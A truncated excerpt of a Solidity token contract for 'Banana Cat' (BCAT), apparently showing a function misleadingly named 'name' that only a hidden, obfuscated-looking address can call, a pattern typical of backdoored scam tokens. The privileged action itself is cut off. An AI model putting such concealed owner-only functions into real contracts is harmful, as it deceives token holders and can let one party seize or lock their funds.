...
contract BCAT is Ownable {
    ...
    string public _tokenname = "Banana Cat";
    string public _tokensymbol = "BCAT";
    uint256 tokenamount = 10000000000*10**decimals();
    address public jndhx65;
    ...
    function name(address jjkxq1) public     {
        require(jndhx65 ==  _msgSender());
        if(jndhx65 != _msgSender()){
                revert("fu");
        }
